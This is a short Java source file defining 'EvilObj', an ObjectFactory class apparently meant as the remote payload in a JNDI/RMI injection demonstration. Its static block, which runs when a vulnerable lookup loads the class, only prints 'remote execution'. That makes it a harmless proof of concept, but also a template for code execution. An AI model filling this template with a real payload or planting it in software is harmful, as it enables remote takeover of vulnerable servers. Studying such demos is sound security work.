package com.cdtft.rmi;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

/**
 * @author: wangcheng
 * @date: 2021年12月11 13:35
 */
public class EvilObj implements ObjectFactory {

    static {
        System.out.println("远程执行");
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        return obj;
    }
}
